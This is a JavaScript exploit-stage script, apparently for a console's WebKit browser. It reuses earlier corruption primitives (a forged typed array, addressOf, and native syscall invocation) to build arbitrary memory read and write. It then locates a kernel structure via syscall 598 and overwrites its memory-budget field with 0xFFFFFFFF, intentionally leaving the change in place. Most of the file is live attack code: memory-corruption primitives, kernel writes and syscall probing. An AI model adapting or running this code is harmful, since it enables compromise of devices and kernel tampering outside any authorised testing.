// FMEM max-value probe: user hypothesis — +0x10 is the browser memory
// max consumed live by kernel accounting; zeroing it = budget 0 (OOM
// poison, reproduced x2). This probe writes the OPPOSITE extreme,
// 0xFFFFFFFF, and LEAVES IT (no restore), then stress-allocates and
// reports: (a) allocation success pattern (OOM = kernel clamps;
// success = value partially consumed; weird death = miscompute),
// (b) whether anything rewrites +0x10 after consumption, (c) oracle
// set 585/606/601/615 while mutated. Result is built and returned
// BEFORE any risky post-probe state; the mutation intentionally
// persists for cross-page observation. Process-local risk accepted.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      typeof native.wrappers.sys598 !== "number" ||
      typeof native.wrappers.sys585 !== "number" ||
      typeof native.wrappers.sys606 !== "number")
    throw new Error("held_plan_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function writeAt(addressValue, bytes) {
    if (!Number.isSafeInteger(addressValue) ||
        addressValue % 8 !== 0 ||
        !bytes || bytes.length !== 8)
      throw new Error("write_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      for (var w = 0; w < 8; w++) carrier[w] = bytes[w];
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function u32At(bytes, off) {
    return ((bytes[off]) | (bytes[off + 1] << 8) |
            (bytes[off + 2] << 16) | (bytes[off + 3] << 24)) >>> 0;
  }
  function u32Bytes(value) {
    return [value & 255, (value >>> 8) & 255,
            (value >>> 16) & 255, (value >>> 24) & 255];
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("ppm_preflight");
  phase = "call_598";
  var sizePtrOff = 0x1e00, bufOff = 0x200;
  var rootBufAddr = plan.addresses.frame + bufOff;
  var sizeAddr = plan.addresses.frame + sizePtrOff;
  var fv = new DataView(plan.frame.buffer);
  var sizeOrig = fv.getUint32(sizePtrOff, true);
  fv.setUint32(sizePtrOff, 0x1000, true);
  fv.setUint32(sizePtrOff + 4, 0, true);
  var call598 = native.call("sys598", [rootBufAddr, sizeAddr]);
  fv.setUint32(sizePtrOff, sizeOrig, true);
  if (call598.value !== 0)
    throw new Error("call598_failed");
  var rootBase = fv.getUint32(bufOff + 4, true) * 0x100000000 +
    fv.getUint32(bufOff, true);
  mark("ppm_598ok");
  phase = "snapshot";
  var snap = readAt(rootBase, 192);
  if (snap[8] !== 0x4f || snap[9] !== 0x52 ||
      snap[10] !== 0x42 || snap[11] !== 0x49)
    throw new Error("orbis_magic_missing");
  var orig10 = snap.slice(0x10, 0x18);
  mark("ppm_snapok");
  // THE EXPERIMENT: write max value, leave it
  phase = "write_max";
  var maxBytes = orig10.slice(0, 4).concat(u32Bytes(0xffffffff));
  writeAt(rootBase + 0x10, maxBytes);
  mark("ppm_written_max");
  // Stress allocations: 8 x 1 MiB, committed (written through)
  phase = "stress_alloc";
  var held = [];
  var allocLog = [];
  for (var a = 0; a < 8; a++) {
    var okAlloc = false, okWrite = false;
    try {
      var buf = new Uint8Array(1048576);
      for (var w = 0; w < 1048576; w += 4096) buf[w] = 0xaa;
      buf[1048575] = 0xbb;
      okWrite = buf[1048575] === 0xbb;
      okAlloc = true;
      held.push(buf);
    } catch (allocError) {
      allocLog.push("a" + a + ":FAIL");
      break;
    }
    allocLog.push("a" + a + ":ok" + (okWrite ? "+w" : "!w"));
  }
  mark("ppm_alloc_done");
  // Re-read +0x10: did anything rewrite it?
  phase = "recheck";
  var cur = readAt(rootBase + 0x10, 8);
  var curHex = "";
  for (var h = 0; h < 8; h++)
    curHex += ("0" + cur[h].toString(16)).slice(-2);
  var stillMax = (u32At(cur, 0) === 0xffffffff);
  // Oracles while mutated
  var c585 = native.call("sys585", [0, 0, 0, 0, 0, 0]);
  var c606 = native.call("sys606", [0, 0, 0, 0, 0, 0]);
  var c601 = native.call("sys601", [0, 0, 0, 0, 0, 0]);
  var e601 = (c601.value === -1) ? native.readErrno() : null;
  var c615 = native.call("sys615", [0, 0, 0, 0, 0, 0]);
  var e615 = (c615.value === -1) ? native.readErrno() : null;
  var after = native.call("getpid", []);
  mark("ppm_done");
  result = { id: "fmem_max_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { root_base: rootBase.toString(16),
      orig10: (function () {
        var s = "";
        for (var i = 0; i < 8; i++)
          s += ("0" + orig10[i].toString(16)).slice(-2);
        return s;
      })(),
      current10: curHex, still_max: stillMax ? 1 : 0,
      alloc: allocLog.join(",").slice(0, 200),
      held_mb: held.length,
      oracles: "585=" + c585.value + " 606=" + c606.value +
        " 601=" + c601.value + (e601 === null ? "" : "e" + e601) +
        " 615=" + c615.value + (e615 === null ? "" : "e" + e615),
      pid_ok: after.value === before.value && after.high === 0,
      mutation_left_in_place: 1 } };
} catch (error) {
  result = { id: "fmem_max_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
